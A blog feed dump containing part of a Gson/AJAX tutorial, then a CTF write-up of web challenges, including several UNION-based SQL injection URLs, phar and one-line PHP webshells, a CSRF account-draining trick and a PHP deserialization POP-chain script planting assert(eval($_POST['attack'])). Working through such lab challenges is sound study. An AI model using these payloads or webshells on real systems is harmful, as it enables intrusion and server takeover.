id="包含泛型的对象"><a href="#包含泛型的对象" class="headerlink" title="包含泛型的对象"></a>包含泛型的对象</h4><p>对于一个包含了泛型的对象比如 List 和 Map 来说，使用简单的 getClass() 是没有办法连同里面包含数据的 Class 一起获取的，那么在将 String 的 Json 转化为对应的实例的时候，就无法获取里面真正的泛型对应数据。比如这里 list.getClass() 之后，拿到的仅仅只是 ArrayList 的 Class 对象，导致了后面调用实例内部元素的方法的时候出错。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">JSON</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Gson gson=<span class="keyword">new</span> Gson();</span><br><span class="line">    List&lt;User&gt; list=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    list.add(<span class="keyword">new</span> User(<span class="string">&quot;Tempest&quot;</span>, <span class="string">&quot;Xorex&quot;</span>, <span class="string">&quot;email&quot;</span>));</span><br><span class="line">    list.add(<span class="keyword">new</span> User(<span class="string">&quot;Yukinoshita&quot;</span>, <span class="string">&quot;Yukino&quot;</span>, <span class="string">&quot;email&quot;</span>));</span><br><span class="line">    String jsonString=gson.toJson(list);</span><br><span class="line">    List&lt;User&gt; jsonList=gson.fromJson(jsonString, list.getClass()); <span class="comment">// 这里传入的 Class 不完整</span></span><br><span class="line">    System.out.println(jsonList.get(<span class="number">0</span>).getEmail()); <span class="comment">//导致了获取集合内部元素之后，无法正常使用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而正确的做法就是利用 <code>TypeToken&lt;T&gt;</code> 来解决，利用匿名内部类的形式创建一个 <code>TypeToken&lt;T&gt;</code> 的实例，调用其方法 <code>getType()</code> 返回的就是泛型 T 所对应完整的 Class，其对应的代码为：<code>new TypeToken&lt;ArrayList&lt;User&gt;&gt;()&#123;&#125;.getType()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">JSON</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Gson gson=<span class="keyword">new</span> Gson();</span><br><span class="line">    List&lt;User&gt; list=<span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    list.add(<span class="keyword">new</span> User(<span class="string">&quot;Tempest&quot;</span>, <span class="string">&quot;Xorex&quot;</span>, <span class="string">&quot;email&quot;</span>));</span><br><span class="line">    list.add(<span class="keyword">new</span> User(<span class="string">&quot;Yukinoshita&quot;</span>, <span class="string">&quot;Yukino&quot;</span>, <span class="string">&quot;email&quot;</span>));</span><br><span class="line">    String jsonString=gson.toJson(list);</span><br><span class="line">    List&lt;User&gt; jsonList=gson.fromJson(jsonString, <span class="keyword">new</span> TypeToken&lt;ArrayList&lt;User&gt;&gt;()&#123;&#125;.getType());</span><br><span class="line">    System.out.println(((User)jsonList.get(<span class="number">0</span>)).getEmail());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>AJAX 是 Asynchronous JavaScript and XML 的缩写，意为异步的 JavaScript 和 XML。它可以利用 JavaScript 去服务器获取响应，并在不刷新的条件下，更新页面的内容。这里只讲述一下关于 jQuery 的 AJAX 的使用方法：</p><h3 id="ajax"><a href="#ajax" class="headerlink" title="$.ajax()"></a>$.ajax()</h3><p>这里使用 <code>$.ajax();</code> 方法来进行发起异步请求，其中方法参数为一个 JSON 对象，这个对象有若干可设置参数：</p><ul><li><p>url 表示发起请求的地址</p></li><li><p>type 表示请求的类型 GET ro POST</p></li><li><p>data 表示请求写代的参数，有两种形式 <code>&quot;key=value&amp;key=value&quot;</code> 和 <code>&quot;&#123;key:value&#125;&quot;</code> 两种</p></li><li><p>success 用于绑定一个方法，为响应成功之后执行的方法，方法需要设置一个参数，用于传入 ajax 响应的响应体数据。</p></li><li><p>dataType 用于标识响应的数据类型，”text” “json” “xml” 之类的。当为 text 的时候，数据会转化为字符串类型，json 的时候，会调用 <code>JSON.parse()</code> 将 String 数据会转化为 json 对象。</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">&quot;#button&quot;</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">                url:<span class="string">&quot;http://localhost:8080/BookStore/ajax?service=ajax&quot;</span>,</span></span><br><span class="line"><span class="javascript">                type: <span class="string">&quot;GET&quot;</span>,</span></span><br><span class="line"><span class="javascript">                data: &#123;<span class="attr">name</span>:<span class="string">&quot;Xorex&quot;</span>&#125;,</span></span><br><span class="line"><span class="javascript">                dataType: <span class="string">&quot;json&quot;</span>,</span></span><br><span class="line"><span class="javascript">                success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                    $(<span class="string">&quot;#h1&quot;</span>).text(<span class="string">&quot;我的名字是：&quot;</span>+data.name);</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> json=&#123;<span class="attr">name</span>:<span class="string">&quot;Xorex&quot;</span>&#125;</span></span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">id</span>=<span class="string">&quot;button&quot;</span>&gt;</span>发送请求<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;h1&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span> <span class="comment">&lt;!-- 用来显示返回的数据 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="get-or-post"><a href="#get-or-post" class="headerlink" title="$.get() or $.post()"></a>$.get() or $.post()</h3><p>这是一种更加简单的发起 ajax 的方式，直接定义了发送请求方式，填写的 JSON 参数可以更加简洁。</p><p><code>$.get(url,data,function,dataType)</code> 和 <code>$.post(url,data,function,datatype)</code> 不需要构造 json，只需要依次填入参数即可。</p><h3 id="getJson"><a href="#getJson" class="headerlink" title="$.getJson()"></a>$.getJson()</h3><p>更离谱 <code>$.getJson(url,data,function)</code> ，只需要了三个参数。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;JSON&quot;&gt;&lt;a href=&quot;#JSON&quot; class=&quot;headerlink&quot; title=&quot;JSON&quot;&gt;&lt;/a&gt;JSON&lt;/h2&gt;&lt;p&gt;关于 JSON 本身的一些信息，可以在：&lt;a href=&quot;https://www.xmind.net/m/rc4VPM/&quot;&gt;</summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="JSON" scheme="https://xorex.space/tags/JSON/"/>
    
    <category term="AJAX" scheme="https://xorex.space/tags/AJAX/"/>
    
  </entry>
  
  <entry>
    <title>极客大挑战 Web 题解</title>
    <link href="https://xorex.space/2021/04/11/f1ba598f1f57/"/>
    <id>https://xorex.space/2021/04/11/f1ba598f1f57/</id>
    <published>2021-04-11T15:00:56.000Z</published>
    <updated>2021-04-11T15:27:00.212Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>该正视过去的那段时光了，虽然并不顺利，但也要记录下来，成为博客文章的一员。</p></blockquote><h2 id="1-朋友的学妹"><a href="#1-朋友的学妹" class="headerlink" title="1.朋友的学妹"></a>1.朋友的学妹</h2><p>直接F12即可。</p><h2 id="2-EZwww"><a href="#2-EZwww" class="headerlink" title="2.EZwww"></a>2.EZwww</h2><p>提示的很清楚了，这里直接用脚本去找备份文件，通过返回的状态码很快就找出来备份文件的文件名，然后下载解压就可以拿到 flag 了</p><h2 id="3-刘壮的黑页"><a href="#3-刘壮的黑页" class="headerlink" title="3.刘壮的黑页"></a>3.刘壮的黑页</h2><p>这个下拉到最下面的地方，然后鼠标选择之后能看到php代码，然后代码审计，直接 GET 提交 username=admin 然后 POST 提交 passwd=syclover 就可以了。</p><h2 id="4-Welcome"><a href="#4-Welcome" class="headerlink" title="4.Welcome"></a>4.Welcome</h2><p>这道题目使用GET访问的时候会显示页面是空白的，刚开始我不知道，以为是人太多导致页面加载不出来，就放在一边看后面的题目了。写了后面的题目再打开发现还是无法打开，搜索 405 错误之后就明白了。</p><p>使用 POST 发送请求，然后会看到一段 PHP 代码，发现需要 POST 上传两个参数，要求上传的两个参数 roam1 和 roam2 值必须严格不同，但是他们的md5计算值却必须是相同的。</p><p>使用数组绕过的方法，让两个都为数组，然后赋上不同的值，这样两个数在比较的时候，值严格不同，在计算 md5 比较的时候，又因为两个变量返回的都是 array 所以计算出来的结果都是相同的。这样成功访问到 phpinfo() 页面。</p><p>经过一遍又一遍的阅读这个超级长的php配置信息，大概获得了两个有用的信息：第一个是有一个叫  f14444aaagggg.php 的文件被预先包含在了每一个页面里面，另外一个信息就是会莫名其妙的发起一个和网页地址一样的参数请求，值为空，猜测是 f14444aaagggg.php 文件里执行出来的，觉得这里可能是突破点。</p><p>然后访问网址 +f14444aaagggg.php 什么都没显示出来，各种操作好像都不太行，所以就暂时放弃了。</p><p>brupsuite！</p><p>原来访问的时候抓一个包就好了，flag藏在响应头里面……</p><p>啊这，flag 还能藏在这里面吗……那就有点不懂发起的那个和网页地址一样的请求的目的是干什么了，而且 <code>auto_prepend_file</code> 不是预加载到每一个页面啊，为什么只有访问 f14444aaagggg.php 才会相应出来 flag 啊，好迷啊。</p><h2 id="5-EZgit"><a href="#5-EZgit" class="headerlink" title="5.EZgit"></a>5.EZgit</h2><p>题目里面很清楚的提示了要使用 Githack，在搜查资料了解了什么是 Githack 和 git 版本泄露之后，就开始下载安装开搞，搞下来之后就找 flag 文件，里面说版本过老，然后用命令切换版本之后再打开就能拿到 Flag 了。</p><h2 id="6-我是大黑客"><a href="#6-我是大黑客" class="headerlink" title="6.我是大黑客"></a>6.我是大黑客</h2><p>下载下来备份文件，然后解压，PHP 文件里面只有一行代码，发现了 eval 和 POST，然后其他的都没有了。搜索了 eval 之后大概明白了是命令注入，然后注入了半天都不知道去哪里拿 Flag。后来搜了搜才知道有种东西叫作一句话木马，有一种工具叫作网站管理工具。下载了蚁剑，学了下基本用法之后成功连接一句话木马。</p><p>之后大概就进入了一个 Linux 命令窗口的地方，只需要用简单的 Linux 命令就可以找到 flag 文件了。</p><h2 id="7-ezbypass"><a href="#7-ezbypass" class="headerlink" title="7.ezbypass"></a>7.ezbypass</h2><p>这里首先让使用 GET 请求上传一个 a 和 b ，要求 a 和 b 值不相等，但是他们使用 strcmp() 函数比较却要求相等（返回零）。这里可以利用这个传入的数据要求是字符串类型，但是传入一个非字符串之后会报错然后返回 0（同样表示相等），这样就绕过了。 但是需要注意的是，这里对 php 的版本是有要求的，必须高于 5.3 版本才行。</p><p>然后会进入第二个页面，要求使用 POST 传入一个值 c 要求这个值，类型不能是数字，但是必须等于123，提交了 c=”123” 之后发现不可以，看来是使用严格判断 === 了， 猜测直接输入表达式，试了 122+1 不行，但是 123+1 就可以了，好奇怪啊。</p><h2 id="8-Flagshop"><a href="#8-Flagshop" class="headerlink" title="8.Flagshop"></a>8.Flagshop</h2><p>这道题目做的真的是爽的要死，打开网页之后大概看了一下整个网站的全貌，就是拿钱买 Flag（浪爷的网页真好看）。但是初始账号里面只有 10 块钱，买 Flag 需要 10000M 块钱，最开始我把 10000M 看成了一万块，就想写一个脚本，然后注册 1000 个账号，向主账号里面把钱都转过去，然后拿钱买 Flag，写了一半发现不太好写，就开始考虑各种奇奇怪怪的方法，比如 SQL 注入来登录浪爷的账号买 Flag 什么的。</p><p>都不行之后开始在网站上漫无目的开始找资料，发现了有一道 CTF 的题目和这个很像，都是转账然后买 Flag ，想要套用这个思路但是发现不太行，它的那个是用注入的方法修改转账逻辑，让初始用户都转帐给它。然而这道题目连转账的 API 都找不到。</p><p>当时主要是不太明白报告里面想要传达的内容，虽说在找资料的时候看到了有关 CSRF 攻击文章，但是没有反应过来。终于等到了浪爷放出了 hint ，就是 CSRF，好家伙，经过阅读了好几篇 CSRF 的文章和看了好几遍整个网站之后，大概理清楚了可能的攻击原理，整个网站的设计都是有一定含义的。浪爷账号的 INF ，转账系统，留言板里面“会查看报告里的链接的”，原来是要从浪爷的账号里要钱。</p><p>然后开始抓转账的包，确定格式，学 HTML 写网页，找了个代码托管平台传了上去并开通 Page 服务。经过反复的试验之后，成功搞出来了一个能用的连接：<a href="https://xorex.gitee.io/">https://xorex.gitee.io/</a> 。暴力枚举 MD5 获得验证码，然后交报告给浪爷之后，果然激活了，从浪爷的钱包里拿到了 1E19 的钱，买到了新爱的 Flag！（还买了蹭饭卡和啊这 EGG{@_2h3_zh3_60_5h1_ro4_dan_chon9ji} ）</p><h2 id="9-忏悔的刘壮"><a href="#9-忏悔的刘壮" class="headerlink" title="9.忏悔的刘壮"></a>9.忏悔的刘壮</h2><p>提交几个忏悔之后，都是刘壮这次没做，最后出现要求三秒钟之内提交，应该就是 Python 脚本题了。</p><p>尝试几次之后，成功猜对一个，然后忏悔数量加一，盲猜应该要忏悔很多次才行。</p><p>然后开始摸索脚本的格式，刚开始请求一直出现 500 错误，然后根据跳转的各个页面找到每个页面的提交格式，然后使用 Session 来保持持续的忏悔，使用 Cookie 里面记录的忏悔答案来提交，保证每次忏悔都对，之后让脚本不停的跑就可以了，最后输出 Flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL1=<span class="string">&quot;http://120.79.197.4:5000/&quot;</span></span><br><span class="line">URL2=<span class="string">&quot;http://120.79.197.4:5000/check&quot;</span></span><br><span class="line">Mysession=requests.session()</span><br><span class="line">Response=Mysession.get(URL1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    Cookie=Response.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>][<span class="number">7</span>]</span><br><span class="line">    Data=&#123;<span class="string">&#x27;answer&#x27;</span>:Cookie&#125;</span><br><span class="line">    Response=Mysession.post(URL2,data=Data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;SYC&#x27;</span> <span class="keyword">in</span> Response.text:</span><br><span class="line">        print(Response.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">       </span><br></pre></td></tr></table></figure><h2 id="10-Myblog"><a href="#10-Myblog" class="headerlink" title="10.Myblog"></a>10.Myblog</h2><p>又是浪爷的题目，爱了爱了。</p><p>刚开始以为是SQL注入，试了好几次什么有价值的回显都没有，暂时搁置了一小段时间。</p><p>后来去观察网页的 URL 确定每个不同的页面是怎样传进去的，然后发现了 index.php 页面是通过 page 的值确定显示的页面。猜测可能使用了文件包含，是传入文件名之后拼接上后缀然后包含。</p><p>试了试果然存在 home.php 和 login.php 页面。</p><p>使用 <code>php://filter</code> 来把这些页面的源码弄下来，在 login.php 里发现了登录成功之后显示的页面 admin/user.php 和 password 生成器（竟然是随机的啊）</p><p>大概查了查资料，结合 admin/user.php 文件里面的代码。明白了这道题怎么利用 Session 的（之前以为 Session 就是 Cookie 的一部分）。然后就是抓包，分析跳转逻辑和账号密码验证逻辑，想到了绕过方法。</p><p>既然随机密码谁都不知道，那么就不让设置密码，POST提交的 Password 也为空，就可以绕过密码比对了。不设置密码只需要带着一个全新的 SessionID，不经过设置密码界面 login.php ，直接提交数据给验证页面 admin/user.php 就可以了（这下操作只能在 Burp 上面实现了）</p><p>操作成功返回了博客后台界面，然后开始读文件上传代码，发现只验证后缀和类型满足是个图片就可以了。还发现了几个页面，但是把代码弄下来之后也没有发现什么有用的信息。</p><p>然后就是上传文件，因为只能是图片文件，所以构造图片马，利用 phar 协议在打开phar文件的时候会执行里面的 php 代码，可以写一些恶意 PHP 代码封装在自己生成的 phar 文件里面，然后在 index.php 页面的 page 参数里面输入 phar 协议来打开这个文件就可以了。</p><p>然后先构造包含上传图片（ phar 改后缀为 jpg ）的上传包，发送之后看回显的上传文件名称，然后在另外一个浏览器使用 phar 协议打开并执行它。</p><p>然后就开始使用各种 PHP 代码来尝试，比如输出 index.php 的代码，查看 phpinfo() 文件（不停发包真的麻烦），试了半天，突然想到我好像有一种东西叫做蚁剑，然后链接上之后就在主目录里面找到了 Flag。</p><p>浪爷的题目好棒啊！！！！</p><h2 id="11-带恶人六撞"><a href="#11-带恶人六撞" class="headerlink" title="11.带恶人六撞"></a>11.带恶人六撞</h2><p>这一看就是 SQL 注入，首先排除数字查询确定是字符查询，然后经过尝试和猜测得出闭合方式是单引号闭合，where 查询输入的 ID 然后然后输出，构造的 SQL 语句很简短。</p><p>有报错回显，用了一下 <code>updatexml()</code> 直接给我回了一个 <code>Hakcer？</code> 看来是被禁用了，但是其他方法的报错注入都没被禁。</p><p><code>--</code> 注释没有被禁   但 <code>--</code> 的末尾空格被禁了。 但是可以这样： <code>-- /**/</code> 来保证 <code>--</code> 后面还有一个空格，成功达成注释效果，后来发现根本不需要注释，末尾应该只有一个 <code>&#39;</code> 所以直接多一个 <code>&#39;</code> 和它一起闭合就可以了。</p><p>使用 <code>union select 1,2,3,4</code> 发现是 1号/2号/4号 通道回显，分别存储着 事件 ID (应该就是 SQL 的 where 查询用的列)，标题和文章链接。</p><p>database 获得当前数据库名称为 geek_sql</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">49.234</span><span class="number">.224</span><span class="number">.119</span>:<span class="number">7415</span><span class="operator">/</span>blog<span class="operator">/</span><span class="number">5.</span>html?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3,database() &#x27;</span></span><br></pre></td></tr></table></figure><p>好了开始翻出来表名有 blog 和 fllllag ：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">49.234</span><span class="number">.224</span><span class="number">.119</span>:<span class="number">7415</span><span class="operator">/</span>blog<span class="operator">/</span><span class="number">5.</span>html?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>geek_sql<span class="string">&#x27; &#x27;</span></span><br></pre></td></tr></table></figure><p>搞列名，有两个id 和 fllllllag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">49.234</span><span class="number">.224</span><span class="number">.119</span>:<span class="number">7415</span><span class="operator">/</span>blog<span class="operator">/</span><span class="number">5.</span>html?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>geek_sql<span class="string">&#x27; and table_name=&#x27;</span>fllllag<span class="string">&#x27; &#x27;</span></span><br></pre></td></tr></table></figure><p>Flag 到手！</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">49.234</span><span class="number">.224</span><span class="number">.119</span>:<span class="number">7415</span><span class="operator">/</span>blog<span class="operator">/</span><span class="number">5.</span>html?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,group_concat(id),group_concat(fllllllag) from fllllag -- /**/</span></span><br></pre></td></tr></table></figure><p>还看到了： <code>longlone_need_gf</code> ，浪爷这么棒的人，肯定会找到属于自己的幸福的啊！</p><h2 id="12-pop-chain-epic"><a href="#12-pop-chain-epic" class="headerlink" title="12.pop chain epic"></a>12.pop chain epic</h2><p>复习了好一会反序列化、继承和静态变量的知识。</p><p>首先找到最后能拿到 Flag 的突破口，然后一步一步往前推就好了。（感谢马师傅 UN8 的训练！）开始以为可能是在 <code>call_user_func($this-&gt;aaa[&quot;object&quot;])</code>  因为可以调用 eval 或者 assert ，但是这需要往里面塞入两个参数，感觉这里不太行。</p><p>继续看发现了可爱的 <code>$this-&gt;aaa[1]($this-&gt;aaa[2]);</code> 这个东西给 <code>$aaa</code> 扔一个 <code>array(&#39;eval&#39;,&#39;$post[&quot;attack&quot;]&#39;)</code> 就可以逛服务器了（实际上是不可以的），这里需要注意的是 “attack” 必须使用双引号括住，因为序列化是不支持单引号的（血和泪的教训）！！！</p><p>但是这些前提就是必须绕过 pop 类中的 <code>__wakeup()</code> 才可以，方法就是在序列化对象的属性数量 +1，超过 pop 类最大属性数量就可以绕过 <code>__wakeup()</code> 方法，不去执行清空语句了。（搜了搜原来这是个CVE 啊）</p><p>执行一句话木马前提就是 <code>call_user_func($this-&gt;aaa[&quot;object&quot;]);</code>  返回的值是 true 才行 这样第二次循环就轮到执行木马了。盯了一圈，发现了了 <code>private $AFKL</code> 属性 ，可以在 <code>$AFKL</code> 设置初始值，然后通过 epic 类中的 <code>__call()</code> 方法中的 <code>$this-&gt;aaa-&gt;$name($params)</code> 来调用从父类 chain 中继承而来的 <code>getAFKL()</code> 方法。</p><p>思路大概就是这样，但是很奇怪的是 <code>__invoke()</code> 方法在这个过程中并没有被使用（当该类的实例化对象被当做函数调用的时候激活）  </p><p>有很多细节是需要注意的：</p><ul><li><p>如果含有 protected 和 private 属性序列化，在对序列化对象进行移动的时候，在本机使用 base64编码。</p></li><li><p>在构造一句话木马的地方是 <code>$a($b)</code> ，$a 为想要调用函数的名称，$b 是想要传入的参数。被称为可变函数。php 会自动寻找和它同名的函数并执行，但是不可以调用语言结构（ php 关键词，语法的一部分）。非常可惜的是一句话木马里面常用的 eval() 是一个语言构造器，无法通过可变函数调用，因此只能使用 assert()</p></li><li><p>eval() 实质性是一个语言构造器，只有一个参数，将接受合法php代码执行。而 assert() 会把整个字符串都当成代码进行执行。</p></li><li><p>将接受参数的语句 <code>&#39;$_POST[&quot;attack&quot;]&#39;</code> 的引号是固定的，因为外层的单引号回将语句当成单纯的字符串而不是魔法常量，内层的双引号可以成功反序列化（单引号会有问题）</p></li><li><p>assert() 在实际执行代码的时候，不知道为什么会有各种奇奇怪怪的错误，所以就直接这样构造了：<code>assert(eval($_POST[&quot;attack&quot;]));</code> 本质上是 eval() 在执行 post 上传的代码。</p></li><li><p>在使用 assert() 连接蚁剑的时候，需要使用 base64 编码模式，不然返回数据为空。</p></li></ul><p>有了明确的思路和细节之后，就可以写代码序列化，然后上传网页之后，用蚁剑连接，在根目录找到了 flag 文件。</p><p>序列化代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pop</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$C1</span>=<span class="keyword">new</span> epic();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;aaa=<span class="keyword">array</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&#x27;eval($_POST[&quot;attack&quot;])&#x27;</span>,<span class="string">&quot;object&quot;</span>=&gt;<span class="keyword">array</span>(<span class="variable">$C1</span>,<span class="string">&quot;getAFKL&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chain</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$AFKL</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">epic</span> <span class="keyword">extends</span> <span class="title">chain</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$aaa</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;aaa=<span class="keyword">new</span> chain();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> pop();</span><br><span class="line"><span class="variable">$a</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$a</span>[<span class="number">10</span>]=<span class="string">&#x27;2&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;该正视过去的那段时光了，虽然并不顺利，但也要记录下来，成为博客文章的一员。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;1-朋友的学妹&quot;&gt;&lt;a href=&quot;#1-朋友的学妹&quot; class=&quot;headerlink&quot; title=&quot;1.朋友的学</summary>
      
    
    
    
    <category term="信息安全" scheme="https://xorex.space/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="极客大挑战" scheme="https://xorex.space/tags/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/"/>
    
  </entry>
  
  <entry>
    <title>Syclover 二面报告</title>
    <link href="https://xorex.space/2021/04/11/221f4c81b7cd/"/>
    <id>https://xorex.space/2021/04/11/221f4c81b7cd/</id>
    <published>2021-04-11T15:00:38.000Z</published>
    <updated>2021-04-11T15:13:43.888Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>是该正视自己的过去了，关于自己在 Syclover 招新的第二次面试报告，也该让它作为自己博客文章的一员了。</p></blockquote><h2 id="任务一"><a href="#任务一" class="headerlink" title="任务一"></a>任务一</h2><h3 id="0x01-搭建环境"><a href="#0x01-搭建环境" class="headerlink" title="0x01 搭建环境"></a>0x01 搭建环境</h3><p>首先抛出一个坑：在网站目录的配置文件里面添加的预加载文件选项是会报服务器内部错误，需要扔到 php.ini 文件里面。这是因为服务器使用的是 CGI 模式运行而不是 Apache 模式运行，在 CGI 模式下，php_value 无法被识别，会导致服务器500错误。</p><p>剩下的东西就按照文档里说的进行操作就能成功搭建网页了。</p><h3 id="0x02-代码审计"><a href="#0x02-代码审计" class="headerlink" title="0x02 代码审计"></a>0x02 代码审计</h3><h4 id="1-CSRF漏洞防御"><a href="#1-CSRF漏洞防御" class="headerlink" title="1. CSRF漏洞防御"></a>1. CSRF漏洞防御</h4><p>特意写了一个 xsrf.php 来对关键请求进行认证，来预防可能的 CSRF 攻击。防御手段是使用 uniqid() 生成时间串，然后将这个时间串 md5 加密之后作为 token 输出在 html 的一个隐藏表单里面，随着用户的点击一起通过 post 提交到后台，然后对这个 token 的值进行验证是否由服务器签发，如果不是，就终止程序，可以有效的防御 CSRF 攻击。</p><h4 id="2-SQL注入防御"><a href="#2-SQL注入防御" class="headerlink" title="2. SQL注入防御"></a>2. 